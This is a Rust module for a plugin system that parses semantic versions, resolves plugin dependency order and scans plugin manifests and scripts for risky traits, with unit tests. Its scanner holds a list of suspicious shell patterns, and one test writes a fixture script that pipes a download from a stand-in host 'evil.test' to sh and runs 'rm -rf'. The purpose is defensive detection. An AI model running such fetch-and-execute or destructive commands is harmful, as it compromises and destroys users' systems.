//! Plugin versioning, dependency management, and security scanning.
//!
//! Extends the [`crate::plugin`] system with three enterprise-grade concerns,
//! all implemented in pure Rust without external crates:
//!
//! - **Versioning** ([`SemVer`], [`VersionReq`]): a self-contained semantic
//!   version parser and a small requirement language (`=`, `>=`, `>`, `<=`,
//!   `<`, `^`, `~`, `*`) used to validate `min_legalis_version` and inter-plugin
//!   dependency constraints.
//! - **Dependency management** ([`resolve_install_order`]): validates that a
//!   plugin's declared dependencies are present and version-compatible, and
//!   computes a topological install order, detecting missing dependencies and
//!   dependency cycles.
//! - **Security scanning** ([`scan_plugin`]): inspects a plugin manifest and its
//!   on-disk entry point for risky traits (over-broad permissions, world-
//!   writable or absolute/escaping entry points, suspicious shell patterns),
//!   producing graded [`SecurityFinding`]s.

use crate::plugin::PluginManifest;
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::fmt;
use std::path::Path;

// ---------------------------------------------------------------------------
// Semantic versioning
// ---------------------------------------------------------------------------

/// A parsed semantic version (`major.minor.patch`, pre-release ignored).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub struct SemVer {
    /// Major version.
    pub major: u64,
    /// Minor version.
    pub minor: u64,
    /// Patch version.
    pub patch: u64,
}

impl SemVer {
    /// Constructs a version from its components.
    pub fn new(major: u64, minor: u64, patch: u64) -> Self {
        Self {
            major,
            minor,
            patch,
        }
    }

    /// Parses a `MAJOR[.MINOR[.PATCH]]` string, tolerating a leading `v` and a
    /// trailing pre-release/build (`-rc1`, `+meta`), which are ignored.
    pub fn parse(input: &str) -> Result<Self, VersionError> {
        let trimmed = input.trim().trim_start_matches(['v', 'V']);
        // Strip pre-release / build metadata.
        let core = trimmed.split(['-', '+']).next().unwrap_or(trimmed).trim();
        if core.is_empty() {
            return Err(VersionError(format!("empty version: '{input}'")));
        }
        let mut parts = core.split('.');
        let major = parse_component(parts.next(), input)?;
        let minor = match parts.next() {
            Some(value) => parse_component(Some(value), input)?,
            None => 0,
        };
        let patch = match parts.next() {
            Some(value) => parse_component(Some(value), input)?,
            None => 0,
        };
        if parts.next().is_some() {
            return Err(VersionError(format!(
                "too many version components: '{input}'"
            )));
        }
        Ok(Self {
            major,
            minor,
            patch,
        })
    }
}

fn parse_component(part: Option<&str>, original: &str) -> Result<u64, VersionError> {
    let value = part.ok_or_else(|| VersionError(format!("missing component in '{original}'")))?;
    value.parse::<u64>().map_err(|_| {
        VersionError(format!(
            "invalid version component '{value}' in '{original}'"
        ))
    })
}

impl fmt::Display for SemVer {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}.{}.{}", self.major, self.minor, self.patch)
    }
}

/// Error parsing a version or requirement.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VersionError(String);

impl fmt::Display for VersionError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl std::error::Error for VersionError {}

/// A version requirement / constraint operator.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ReqOp {
    /// Exact match.
    Exact,
    /// Greater than.
    Greater,
    /// Greater or equal.
    GreaterEq,
    /// Less than.
    Less,
    /// Less or equal.
    LessEq,
    /// Caret: compatible within the same left-most non-zero component.
    Caret,
    /// Tilde: allows patch-level (or minor when no patch given) changes.
    Tilde,
    /// Wildcard: matches anything.
    Wildcard,
}

/// A parsed version requirement.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VersionReq {
    op: ReqOp,
    version: SemVer,
}

impl VersionReq {
    /// A requirement that matches any version.
    pub fn any() -> Self {
        Self {
            op: ReqOp::Wildcard,
            version: SemVer::new(0, 0, 0),
        }
    }

    /// Parses a requirement such as `^1.2`, `>=0.2.0`, `=1.0.0`, `1.2.3`, `*`.
    ///
    /// A bare version (no operator) is treated as a caret requirement, matching
    /// common ecosystem conventions.
    pub fn parse(input: &str) -> Result<Self, VersionError> {
        let trimmed = input.trim();
        if trimmed == "*" || trimmed.is_empty() {
            return Ok(Self::any());
        }
        let (op, rest) = if let Some(rest) = trimmed.strip_prefix(">=") {
            (ReqOp::GreaterEq, rest)
        } else if let Some(rest) = trimmed.strip_prefix("<=") {
            (ReqOp::LessEq, rest)
        } else if let Some(rest) = trimmed.strip_prefix('>') {
            (ReqOp::Greater, rest)
        } else if let Some(rest) = trimmed.strip_prefix('<') {
            (ReqOp::Less, rest)
        } else if let Some(rest) = trimmed.strip_prefix('=') {
            (ReqOp::Exact, rest)
        } else if let Some(rest) = trimmed.strip_prefix('^') {
            (ReqOp::Caret, rest)
        } else if let Some(rest) = trimmed.strip_prefix('~') {
            (ReqOp::Tilde, rest)
        } else {
            (ReqOp::Caret, trimmed)
        };
        Ok(Self {
            op,
            version: SemVer::parse(rest)?,
        })
    }

    /// Whether `candidate` satisfies this requirement.
    pub fn matches(&self, candidate: &SemVer) -> bool {
        let base = self.version;
        match self.op {
            ReqOp::Wildcard => true,
            ReqOp::Exact => *candidate == base,
            ReqOp::Greater => *candidate > base,
            ReqOp::GreaterEq => *candidate >= base,
            ReqOp::Less => *candidate < base,
            ReqOp::LessEq => *candidate <= base,
            ReqOp::Caret => caret_matches(base, candidate),
            ReqOp::Tilde => tilde_matches(base, candidate),
        }
    }
}

/// Caret semantics: allow changes that do not modify the left-most non-zero
/// component (`^1.2.3` => `>=1.2.3, <2.0.0`; `^0.2.3` => `>=0.2.3, <0.3.0`;
/// `^0.0.3` => `>=0.0.3, <0.0.4`).
fn caret_matches(base: SemVer, candidate: &SemVer) -> bool {
    if *candidate < base {
        return false;
    }
    if base.major > 0 {
        candidate.major == base.major
    } else if base.minor > 0 {
        candidate.major == 0 && candidate.minor == base.minor
    } else {
        candidate.major == 0 && candidate.minor == 0 && candidate.patch == base.patch
    }
}

/// Tilde semantics: allow patch-level changes (`~1.2.3` => `>=1.2.3, <1.3.0`;
/// `~1.2` => `>=1.2.0, <1.3.0`; `~1` => `>=1.0.0, <2.0.0`). Since we always
/// parse to three components, `~1.2.3` and `~1.2` both pin the minor.
fn tilde_matches(base: SemVer, candidate: &SemVer) -> bool {
    if *candidate < base {
        return false;
    }
    candidate.major == base.major && candidate.minor == base.minor
}

// ---------------------------------------------------------------------------
// Dependency management
// ---------------------------------------------------------------------------

/// A dependency-resolution problem.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum DependencyError {
    /// A required dependency is not installed.
    Missing {
        /// The plugin needing the dependency.
        plugin: String,
        /// The missing dependency name.
        dependency: String,
        /// The required version range.
        requirement: String,
    },
    /// A dependency is installed but its version is incompatible.
    Incompatible {
        /// The plugin needing the dependency.
        plugin: String,
        /// The dependency name.
        dependency: String,
        /// The required version range.
        requirement: String,
        /// The installed version.
        found: String,
    },
    /// A dependency cycle was detected.
    Cycle {
        /// The plugins forming the cycle.
        plugins: Vec<String>,
    },
    /// A version string failed to parse.
    BadVersion {
        /// The plugin whose version/requirement was malformed.
        plugin: String,
        /// The error detail.
        detail: String,
    },
}

impl fmt::Display for DependencyError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            DependencyError::Missing {
                plugin,
                dependency,
                requirement,
            } => write!(
                f,
                "plugin '{plugin}' requires '{dependency}' ({requirement}), which is not installed"
            ),
            DependencyError::Incompatible {
                plugin,
                dependency,
                requirement,
                found,
            } => write!(
                f,
                "plugin '{plugin}' requires '{dependency}' ({requirement}), but version {found} is installed"
            ),
            DependencyError::Cycle { plugins } => {
                write!(f, "dependency cycle detected: {}", plugins.join(" -> "))
            }
            DependencyError::BadVersion { plugin, detail } => {
                write!(f, "plugin '{plugin}' has an invalid version: {detail}")
            }
        }
    }
}

/// Validates all inter-plugin dependencies among `manifests`, returning every
/// problem found (empty when the dependency graph is satisfiable).
pub fn validate_dependencies(manifests: &[PluginManifest]) -> Vec<DependencyError> {
    let mut errors = Vec::new();
    let mut versions: HashMap<&str, SemVer> = HashMap::new();

    for manifest in manifests {
        match SemVer::parse(&manifest.version) {
            Ok(version) => {
                versions.insert(manifest.name.as_str(), version);
            }
            Err(error) => errors.push(DependencyError::BadVersion {
                plugin: manifest.name.clone(),
                detail: error.to_string(),
            }),
        }
    }

    for manifest in manifests {
        for (dependency, requirement) in &manifest.dependencies {
            let req = match VersionReq::parse(requirement) {
                Ok(req) => req,
                Err(error) => {
                    errors.push(DependencyError::BadVersion {
                        plugin: manifest.name.clone(),
                        detail: format!("requirement '{requirement}': {error}"),
                    });
                    continue;
                }
            };
            match versions.get(dependency.as_str()) {
                None => errors.push(DependencyError::Missing {
                    plugin: manifest.name.clone(),
                    dependency: dependency.clone(),
                    requirement: requirement.clone(),
                }),
                Some(found) if !req.matches(found) => {
                    errors.push(DependencyError::Incompatible {
                        plugin: manifest.name.clone(),
                        dependency: dependency.clone(),
                        requirement: requirement.clone(),
                        found: found.to_string(),
                    });
                }
                Some(_) => {}
            }
        }
    }

    errors
}

/// Computes a topological install order such that every plugin appears after
/// its dependencies, validating presence/compatibility first.
///
/// Returns the ordered plugin names on success, or the dependency errors
/// (including any cycle) on failure.
pub fn resolve_install_order(
    manifests: &[PluginManifest],
) -> Result<Vec<String>, Vec<DependencyError>> {
    let mut errors = validate_dependencies(manifests);

    // Build an adjacency map limited to dependencies that are present, so cycle
    // detection operates on the resolvable subgraph.
    let present: BTreeSet<&str> = manifests.iter().map(|m| m.name.as_str()).collect();
    let mut deps: BTreeMap<String, Vec<String>> = BTreeMap::new();
    for manifest in manifests {
        let edges: Vec<String> = manifest
            .dependencies
            .keys()
            .filter(|d| present.contains(d.as_str()))
            .cloned()
            .collect();
        deps.insert(manifest.name.clone(), edges);
    }

    // Kahn's algorithm over the "depends-on" graph. A node is ready when all of
    // its dependencies have been emitted.
    let mut emitted: BTreeSet<String> = BTreeSet::new();
    let mut order: Vec<String> = Vec::new();
    let total = deps.len();
    loop {
        let mut progressed = false;
        for (name, edges) in &deps {
            if emitted.contains(name) {
                continue;
            }
            if edges.iter().all(|e| emitted.contains(e)) {
                emitted.insert(name.clone());
                order.push(name.clone());
                progressed = true;
            }
        }
        if order.len() == total {
            break;
        }
        if !progressed {
            // Remaining nodes form one or more cycles.
            let mut cycle: Vec<String> = deps
                .keys()
                .filter(|name| !emitted.contains(*name))
                .cloned()
                .collect();
            cycle.sort();
            errors.push(DependencyError::Cycle { plugins: cycle });
            break;
        }
    }

    if errors.is_empty() {
        Ok(order)
    } else {
        Err(errors)
    }
}

/// Checks whether a plugin is compatible with the running `legalis` version.
///
/// Returns `Ok(())` when compatible (or when the manifest declares no minimum),
/// otherwise an explanatory error.
pub fn check_min_legalis_version(
    manifest: &PluginManifest,
    legalis_version: &str,
) -> Result<(), VersionError> {
    let Some(min) = &manifest.min_legalis_version else {
        return Ok(());
    };
    let required = SemVer::parse(min)?;
    let current = SemVer::parse(legalis_version)?;
    if current >= required {
        Ok(())
    } else {
        Err(VersionError(format!(
            "plugin '{}' requires legalis >= {}, but {} is running",
            manifest.name, required, current
        )))
    }
}

// ---------------------------------------------------------------------------
// Security scanning
// ---------------------------------------------------------------------------

/// Severity of a security finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    /// Informational note.
    Info,
    /// Low-risk concern.
    Low,
    /// Medium-risk concern.
    Medium,
    /// High-risk concern.
    High,
    /// Critical risk; should block installation.
    Critical,
}

/// A single security finding from scanning a plugin.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SecurityFinding {
    /// The finding severity.
    pub severity: Severity,
    /// A short machine-stable code.
    pub code: String,
    /// A human-readable description.
    pub message: String,
}

/// The result of scanning a plugin.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityReport {
    /// The plugin name scanned.
    pub plugin: String,
    /// All findings, most severe first.
    pub findings: Vec<SecurityFinding>,
}

impl SecurityReport {
    /// The highest severity among the findings, if any.
    pub fn max_severity(&self) -> Option<Severity> {
        self.findings.iter().map(|f| f.severity).max()
    }

    /// Whether the report contains a finding at or above `threshold`.
    pub fn has_at_least(&self, threshold: Severity) -> bool {
        self.findings.iter().any(|f| f.severity >= threshold)
    }

    /// Whether the plugin passes a scan given the blocking `threshold`.
    pub fn passes(&self, threshold: Severity) -> bool {
        !self.has_at_least(threshold)
    }
}

/// Permissions considered sensitive; requesting them yields findings.
const SENSITIVE_PERMISSIONS: &[(&str, Severity)] = &[
    ("network", Severity::Medium),
    ("filesystem-write", Severity::Medium),
    ("filesystem-read", Severity::Low),
    ("process-spawn", Severity::High),
    ("env-read", Severity::Low),
    ("all", Severity::Critical),
];

/// Suspicious substrings in a script entry point that warrant a warning.
const SUSPICIOUS_PATTERNS: &[(&str, Severity, &str)] = &[
    ("rm -rf", Severity::High, "destructive recursive delete"),
    ("curl ", Severity::Medium, "network download"),
    ("wget ", Severity::Medium, "network download"),
    ("| sh", Severity::High, "pipe-to-shell execution"),
    ("| bash", Severity::High, "pipe-to-shell execution"),
    ("eval ", Severity::Medium, "dynamic code evaluation"),
    ("sudo ", Severity::High, "privilege escalation"),
    ("base64 -d", Severity::Medium, "obfuscated payload decode"),
    ("/etc/passwd", Severity::High, "sensitive file access"),
];

/// Scans a plugin manifest and (when present) its on-disk entry point under
/// `plugin_root` for security concerns.
pub fn scan_plugin(manifest: &PluginManifest, plugin_root: Option<&Path>) -> SecurityReport {
    let mut findings = Vec::new();

    // 1. Permission analysis.
    for permission in &manifest.permissions {
        if let Some((_, severity)) = SENSITIVE_PERMISSIONS
            .iter()
            .find(|(name, _)| *name == permission)
        {
            findings.push(SecurityFinding {
                severity: *severity,
                code: "permission".to_string(),
                message: format!("requests sensitive permission '{permission}'"),
            });
        }
    }

    // 2. Entry-point path analysis.
    let entry = manifest.entry_point.trim();
    if Path::new(entry).is_absolute() {
        findings.push(SecurityFinding {
            severity: Severity::High,
            code: "entry-absolute".to_string(),
            message: format!("entry point is an absolute path: {entry}"),
        });
    }
    if entry.contains("..") {
        findings.push(SecurityFinding {
            severity: Severity::High,
            code: "entry-escape".to_string(),
            message: format!("entry point escapes the plugin directory: {entry}"),
        });
    }

    // 3. Script content analysis (best-effort; only if the file is readable).
    if let Some(root) = plugin_root {
        let entry_path = root.join(entry);
        if let Ok(content) = std::fs::read_to_string(&entry_path) {
            let lowered = content.to_ascii_lowercase();
            for (pattern, severity, reason) in SUSPICIOUS_PATTERNS {
                if lowered.contains(pattern) {
                    findings.push(SecurityFinding {
                        severity: *severity,
                        code: "script-pattern".to_string(),
                        message: format!("entry point contains '{pattern}' ({reason})"),
                    });
                }
            }
        }
    }

    // 4. Manifest hygiene: an unpinned dependency (`*`) is a supply-chain risk.
    for (dependency, requirement) in &manifest.dependencies {
        if requirement.trim() == "*" {
            findings.push(SecurityFinding {
                severity: Severity::Low,
                code: "unpinned-dependency".to_string(),
                message: format!("dependency '{dependency}' is unpinned ('*')"),
            });
        }
    }

    // Sort most-severe first for display.
    findings.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| a.code.cmp(&b.code))
    });

    SecurityReport {
        plugin: manifest.name.clone(),
        findings,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::plugin::PluginType;

    fn manifest(name: &str, version: &str) -> PluginManifest {
        PluginManifest {
            name: name.to_string(),
            version: version.to_string(),
            description: String::new(),
            author: String::new(),
            min_legalis_version: None,
            entry_point: "./run.sh".to_string(),
            plugin_type: PluginType::Extension,
            commands: vec![],
            hooks: vec![],
            dependencies: BTreeMap::new(),
            permissions: vec![],
        }
    }

    #[test]
    fn test_semver_parse() {
        assert_eq!(SemVer::parse("1.2.3").unwrap(), SemVer::new(1, 2, 3));
        assert_eq!(SemVer::parse("v2.0").unwrap(), SemVer::new(2, 0, 0));
        assert_eq!(SemVer::parse("3").unwrap(), SemVer::new(3, 0, 0));
        assert_eq!(SemVer::parse("1.4.0-rc1").unwrap(), SemVer::new(1, 4, 0));
        assert!(SemVer::parse("").is_err());
        assert!(SemVer::parse("a.b.c").is_err());
        assert!(SemVer::parse("1.2.3.4").is_err());
    }

    #[test]
    fn test_semver_ordering() {
        assert!(SemVer::new(1, 0, 0) < SemVer::new(1, 0, 1));
        assert!(SemVer::new(1, 2, 0) > SemVer::new(1, 1, 9));
        assert!(SemVer::new(2, 0, 0) > SemVer::new(1, 99, 99));
    }

    #[test]
    fn test_version_req_basic_ops() {
        assert!(
            VersionReq::parse(">=1.0.0")
                .unwrap()
                .matches(&SemVer::new(1, 2, 0))
        );
        assert!(
            !VersionReq::parse(">=1.0.0")
                .unwrap()
                .matches(&SemVer::new(0, 9, 0))
        );
        assert!(
            VersionReq::parse("=1.2.3")
                .unwrap()
                .matches(&SemVer::new(1, 2, 3))
        );
        assert!(
            !VersionReq::parse("=1.2.3")
                .unwrap()
                .matches(&SemVer::new(1, 2, 4))
        );
        assert!(
            VersionReq::parse("<2.0.0")
                .unwrap()
                .matches(&SemVer::new(1, 9, 9))
        );
        assert!(
            VersionReq::parse("*")
                .unwrap()
                .matches(&SemVer::new(5, 5, 5))
        );
    }

    #[test]
    fn test_version_req_caret() {
        let req = VersionReq::parse("^1.2.3").unwrap();
        assert!(req.matches(&SemVer::new(1, 2, 3)));
        assert!(req.matches(&SemVer::new(1, 9, 0)));
        assert!(!req.matches(&SemVer::new(2, 0, 0)));
        assert!(!req.matches(&SemVer::new(1, 2, 2)));

        let zero = VersionReq::parse("^0.2.3").unwrap();
        assert!(zero.matches(&SemVer::new(0, 2, 9)));
        assert!(!zero.matches(&SemVer::new(0, 3, 0)));
    }

    #[test]
    fn test_version_req_tilde() {
        let req = VersionReq::parse("~1.2.0").unwrap();
        assert!(req.matches(&SemVer::new(1, 2, 5)));
        assert!(!req.matches(&SemVer::new(1, 3, 0)));
    }

    #[test]
    fn test_bare_version_is_caret() {
        let req = VersionReq::parse("1.2.0").unwrap();
        assert!(req.matches(&SemVer::new(1, 5, 0)));
        assert!(!req.matches(&SemVer::new(2, 0, 0)));
    }

    #[test]
    fn test_check_min_legalis_version() {
        let mut m = manifest("p", "1.0.0");
        m.min_legalis_version = Some("0.2.0".to_string());
        assert!(check_min_legalis_version(&m, "0.2.6").is_ok());
        assert!(check_min_legalis_version(&m, "0.1.0").is_err());
        // No minimum declared -> always compatible.
        let n = manifest("q", "1.0.0");
        assert!(check_min_legalis_version(&n, "0.0.1").is_ok());
    }

    #[test]
    fn test_validate_dependencies_ok() {
        let mut a = manifest("a", "1.0.0");
        a.dependencies
            .insert("b".to_string(), ">=1.0.0".to_string());
        let b = manifest("b", "1.2.0");
        let errors = validate_dependencies(&[a, b]);
        assert!(errors.is_empty(), "{errors:?}");
    }

    #[test]
    fn test_validate_dependencies_missing() {
        let mut a = manifest("a", "1.0.0");
        a.dependencies
            .insert("b".to_string(), ">=1.0.0".to_string());
        let errors = validate_dependencies(&[a]);
        assert_eq!(errors.len(), 1);
        assert!(matches!(errors[0], DependencyError::Missing { .. }));
    }

    #[test]
    fn test_validate_dependencies_incompatible() {
        let mut a = manifest("a", "1.0.0");
        a.dependencies.insert("b".to_string(), "^2.0.0".to_string());
        let b = manifest("b", "1.0.0");
        let errors = validate_dependencies(&[a, b]);
        assert_eq!(errors.len(), 1);
        assert!(matches!(errors[0], DependencyError::Incompatible { .. }));
    }

    #[test]
    fn test_resolve_install_order() {
        // c depends on b, b depends on a -> order a, b, c.
        let a = manifest("a", "1.0.0");
        let mut b = manifest("b", "1.0.0");
        b.dependencies.insert("a".to_string(), "*".to_string());
        let mut c = manifest("c", "1.0.0");
        c.dependencies.insert("b".to_string(), "*".to_string());
        let order = resolve_install_order(&[c, b, a]).expect("order");
        let pos = |name: &str| order.iter().position(|n| n == name).unwrap();
        assert!(pos("a") < pos("b"));
        assert!(pos("b") < pos("c"));
    }

    #[test]
    fn test_resolve_detects_cycle() {
        let mut a = manifest("a", "1.0.0");
        a.dependencies.insert("b".to_string(), "*".to_string());
        let mut b = manifest("b", "1.0.0");
        b.dependencies.insert("a".to_string(), "*".to_string());
        let result = resolve_install_order(&[a, b]);
        assert!(result.is_err());
        let errors = result.unwrap_err();
        assert!(
            errors
                .iter()
                .any(|e| matches!(e, DependencyError::Cycle { .. }))
        );
    }

    #[test]
    fn test_scan_clean_plugin() {
        let report = scan_plugin(&manifest("clean", "1.0.0"), None);
        assert!(report.findings.is_empty());
        assert!(report.passes(Severity::Medium));
        assert_eq!(report.max_severity(), None);
    }

    #[test]
    fn test_scan_sensitive_permission() {
        let mut m = manifest("net", "1.0.0");
        m.permissions = vec!["all".to_string()];
        let report = scan_plugin(&m, None);
        assert_eq!(report.max_severity(), Some(Severity::Critical));
        assert!(!report.passes(Severity::High));
    }

    #[test]
    fn test_scan_absolute_entry_point() {
        let mut m = manifest("abs", "1.0.0");
        m.entry_point = "/usr/bin/evil".to_string();
        let report = scan_plugin(&m, None);
        assert!(report.findings.iter().any(|f| f.code == "entry-absolute"));
    }

    #[test]
    fn test_scan_escaping_entry_point() {
        let mut m = manifest("esc", "1.0.0");
        m.entry_point = "../../../etc/cron.d/x".to_string();
        let report = scan_plugin(&m, None);
        assert!(report.findings.iter().any(|f| f.code == "entry-escape"));
    }

    #[test]
    fn test_scan_script_patterns() {
        let dir =
            std::env::temp_dir().join(format!("legalis-plugin-scan-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).expect("mkdir");
        let mut m = manifest("scripty", "1.0.0");
        m.entry_point = "run.sh".to_string();
        std::fs::write(
            dir.join("run.sh"),
            "#!/bin/sh\ncurl http://evil.test/x | sh\nrm -rf /tmp/data\n",
        )
        .expect("write script");
        let report = scan_plugin(&m, Some(&dir));
        assert!(report.findings.iter().any(|f| f.code == "script-pattern"));
        assert!(report.has_at_least(Severity::High));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_scan_unpinned_dependency() {
        let mut m = manifest("loose", "1.0.0");
        m.dependencies.insert("other".to_string(), "*".to_string());
        let report = scan_plugin(&m, None);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.code == "unpinned-dependency")
        );
    }
}
